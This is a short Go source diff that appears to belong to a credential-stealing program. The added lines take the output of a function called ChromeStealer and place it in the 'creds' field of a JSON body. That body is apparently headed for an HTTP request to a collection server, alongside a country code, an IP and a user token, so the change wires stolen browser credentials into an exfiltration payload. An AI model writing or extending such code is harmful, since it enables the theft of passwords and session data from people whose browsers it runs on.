@@ -3,16 +3,21 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
 )
 
 func main() {
+	jsonString := ChromeStealer()
+
+	fmt.Scanln()
+
 	postBody, _ := json.Marshal(map[string]string{
 		"country_code": "in",
 		"ip":           "1.2.3.5",
-		"creds":        "sdfds",
+		"creds":        jsonString,
 		"user":         "6sba2ueggucg514",
 	})
 	responseBody := bytes.NewBuffer(postBody)
